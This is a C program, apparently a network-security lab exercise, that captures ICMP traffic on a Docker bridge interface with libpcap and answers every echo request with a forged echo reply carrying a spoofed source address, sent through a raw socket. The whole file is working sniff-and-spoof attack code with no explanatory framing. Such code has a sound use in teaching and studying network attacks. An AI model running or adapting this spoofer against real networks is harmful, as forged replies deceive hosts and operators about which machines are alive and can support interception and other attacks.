#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <stdlib.h>

#define BUFSIZE 1024

// Function to calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Callback function for packet sniffing
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    struct iphdr *ip_hdr = (struct iphdr *)(packet + 14);  // Skip Ethernet header
    struct icmphdr *icmp_hdr = (struct icmphdr *)(packet + 14 + ip_hdr->ihl * 4);

    if (icmp_hdr->type == ICMP_ECHO) { // Check if it's an Echo Request
        printf("ICMP Echo Request detected from %s\n", inet_ntoa(*(struct in_addr *)&ip_hdr->saddr));

        // Set up the raw socket
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) {
            perror("Socket creation failed");
            return;
        }
	
	// Set only the IP_HDRINCL flag
	int one = 1;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

        // Build the spoofed IP header
        struct iphdr ip;
        ip.version = 4;
        ip.ihl = 5;
        ip.tos = 0;
        ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
        ip.id = rand();
        ip.frag_off = 0;
        ip.ttl = 64;
        ip.protocol = IPPROTO_ICMP;
        ip.saddr = ip_hdr->daddr; // Spoofed source IP (destination of original request)
        ip.daddr = ip_hdr->saddr; // Destination IP (source of original request)

        // Build the ICMP header for Echo Reply
        struct icmphdr icmp;
        icmp.type = ICMP_ECHOREPLY;
        icmp.code = 0;
        icmp.un.echo.id = icmp_hdr->un.echo.id;
        icmp.un.echo.sequence = icmp_hdr->un.echo.sequence;
        icmp.checksum = 0;

        // Calculate the checksum
        icmp.checksum = checksum(&icmp, sizeof(icmp));

        // Create the packet
        char packet[sizeof(struct iphdr) + sizeof(struct icmphdr)];
        memcpy(packet, &ip, sizeof(struct iphdr));
        memcpy(packet + sizeof(struct iphdr), &icmp, sizeof(struct icmphdr));

        // Set destination information
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = ip.daddr;

        // Send the spoofed packet
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Packet send failed");
        } else {
            printf("Spoofed ICMP Echo Reply sent to %s\n", inet_ntoa(*(struct in_addr *)&ip_hdr->saddr));
        }

        // Close the socket
        close(sock);
    }
}

int main() {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

    // Open the network device for packet sniffing in promiscuous mode
    handle = pcap_open_live("br-6d579396a370", BUFSIZE, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
        return 2;
    }

    // Filter for ICMP packets only
    struct bpf_program fp;
    char filter_exp[] = "icmp";
    pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN);
    pcap_setfilter(handle, &fp);

    // Start sniffing and call got_packet function for each captured packet
    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle); // Close the pcap handle
    return 0;
}

